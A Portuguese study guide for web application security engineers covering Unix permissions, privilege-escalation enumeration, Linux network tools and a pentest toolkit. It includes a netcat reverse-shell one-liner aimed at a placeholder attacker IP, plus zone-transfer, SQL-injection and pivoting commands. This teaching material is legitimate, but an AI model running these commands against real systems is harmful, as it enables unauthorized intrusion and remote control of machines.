O modelo de permissões Unix parece simples mas tem nuances críticas. Cada arquivo tem 9 bits de permissão + 3 bits especiais:

  • Leitura (r=4): ler conteúdo do arquivo / listar diretório.
  • Escrita (w=2): modificar arquivo / criar/deletar dentro do diretório.
  • Execução (x=1): executar arquivo / entrar no diretório (cd).
  • SUID (s): executa com UID do dono. Binário SUID root = potencial escalada.
  • SGID (s no grupo): executa com GID do grupo. Em diretórios: novos arquivos herdam o grupo.
  • Sticky bit (t): em diretórios: só o dono pode deletar seus arquivos (/tmp).

Encontrar vetores de escalada de privilégios:

  • find / -perm -4000 2>/dev/null — lista todos os binários SUID.
  • find / -writable -type f 2>/dev/null — arquivos graváveis por você.
  • crontab -l && cat /etc/crontab — tarefas agendadas mal configuradas.
  • LinPEAS / LinEnum: scripts automatizados de enumeração de escalada de privilégios Linux — essenciais no toolkit de qualquer pentester.

O Web AppSec Engineer precisa dominar as ferramentas de rede do Linux — tanto para reconhecimento ativo quanto para análise de tráfego:

  • nmap: scanner de portas e serviços. nmap -sV -sC -p- target.com descobre todos os serviços com versões e scripts NSE de detecção de vulnerabilidades.
  • curl: cliente HTTP completo. curl -v -X POST -d 'user=admin' https://target.com/login. Essencial para testar endpoints manualmente.
  • netcat (nc): canivete suíço de rede. Shell reversa: nc -e /bin/bash attacker_ip 4444. Escuta de porta: nc -lvnp 4444.
  • tcpdump: captura pacotes na interface de rede. tcpdump -i eth0 -w capture.pcap host target.com. Útil para analisar tráfego de aplicações.
  • Wireshark: análise visual de capturas de rede. Revela cookies, tokens, dados em texto plano em tráfego HTTP.
  • dig / nslookup: consultas DNS. dig axfr @ns1.target.com target.com — transferência de zona DNS (se permitida, revela todos os subdomínios).
  • ssh: ssh -L 8080:localhost:3306 user@server — tunelamento local. Fundamental para pivoting em ambientes comprometidos.

Com Ubuntu como base, você tem acesso a todo o ecossistema de ferramentas de Web AppSec. Este é o kit essencial que você vai usar no dia a dia:

  • Burp Suite Community/Pro: proxy interceptador HTTP. A ferramenta mais importante para pentest web. Intercepta, modifica, repete e faz fuzzing de requisições.
  • sqlmap: detecção e exploração automatizada de SQL Injection. sqlmap -u "https://target.com/item?id=1" --dbs
  • ffuf / gobuster: fuzzing de diretórios e parâmetros. ffuf -w wordlist.txt -u https://target.com/FUZZ
  • nuclei: scanner de vulnerabilidades baseado em templates YAML. Cobertura enorme de CVEs e misconfigs.
  • nikto: scanner de vulnerabilidades de servidores web (headers, misconfigs, arquivos expostos).
  • whatweb / wappalyzer: fingerprinting de tecnologias web (CMS, frameworks, servidores).
  • subfinder / amass: enumeração de subdomínios — fase de reconhecimento passivo/ativo.
  • john / hashcat: cracking de hashes de senhas. Importante entender para avaliar a força das políticas de senha.
  • Metasploit: framework de exploração. Base de dados de exploits públicos, payloads, listeners.
  • Python3 + requests + beautifulsoup: para escrever seus próprios scripts de automação de testes.

Próximo passo: todos esses tópicos de fundamento são a base. Com eles dominados, o caminho natural é: HTTP/HTTPS em profundidade → OWASP Top 10 → Burp Suite → Web AppSec na prática.
